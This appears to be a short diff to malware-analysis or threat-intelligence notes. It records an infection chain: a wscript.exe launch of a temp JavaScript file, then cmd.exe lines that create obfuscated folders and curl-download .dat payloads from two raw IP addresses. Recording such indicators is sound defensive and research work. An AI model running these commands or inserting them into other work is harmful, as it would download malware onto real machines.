@@ -33,7 +33,7 @@ Exec >> #2
 
 wscript.exe C:\Users\Admin\AppData\Local\Temp\XCJPIM.js
 
-cmd.exe" /c mkdir  C:\Ifdkijefset\Mdiejefkdlgser & curl http://162.55.217.30/gRMS/0.8566793715190715.dat --output C:\Ifdkijefset\Mdiejefkdlgser\Skkdfjekke.OOOOOCCCCCCCCXXXXXXXXXXXX
+cmd.exe /c mkdir  C:\Ifdkijefset\Mdiejefkdlgser & curl http://162.55.217.30/gRMS/0.8566793715190715.dat --output C:\Ifdkijefset\Mdiejefkdlgser\Skkdfjekke.OOOOOCCCCCCCCXXXXXXXXXXXX
 
 cmd.exe /c mkdir  C:\Ifdkijefset\Mdiejefkdlgser & curl http://157.90.166.88/O3ZlYNW/0.8392080340563924.dat --output C:\Ifdkijefset\Mdiejefkdlgser\Skkdfjekke.OOOOOCCCCCCCCXXXXXXXXXXXX
 
